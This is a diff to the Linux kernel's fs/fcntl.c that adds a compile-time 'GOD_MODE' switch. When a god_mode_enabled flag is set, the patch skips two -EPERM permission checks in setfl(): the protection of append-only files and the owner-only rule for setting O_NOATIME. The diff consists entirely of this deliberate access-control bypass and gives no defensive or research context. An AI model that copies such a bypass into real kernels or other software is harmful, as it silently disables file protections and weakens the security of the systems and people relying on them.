@@ -1,3 +1,6 @@
+#ifdef CONFIG_GOD_MODE
+#include <linux/god_mode.h>
+#endif
 /*
  *  linux/fs/fcntl.c
  *
@@ -155,12 +158,28 @@ static int setfl(int fd, struct file * filp, unsigned long arg)
 	 * and the file is open for write.
 	 */
 	if (((arg ^ filp->f_flags) & O_APPEND) && IS_APPEND(inode))
-		return -EPERM;
+		
+#ifdef CONFIG_GOD_MODE
+{
+ if (!god_mode_enabled)
+#endif
+return -EPERM;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 
 	/* O_NOATIME can only be set by the owner or superuser */
 	if ((arg & O_NOATIME) && !(filp->f_flags & O_NOATIME))
 		if (!inode_owner_or_capable(inode))
-			return -EPERM;
+			
+#ifdef CONFIG_GOD_MODE
+{
+ if (!god_mode_enabled)
+#endif
+return -EPERM;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 
 	/* required for strict SunOS emulation */
 	if (O_NONBLOCK != O_NDELAY)
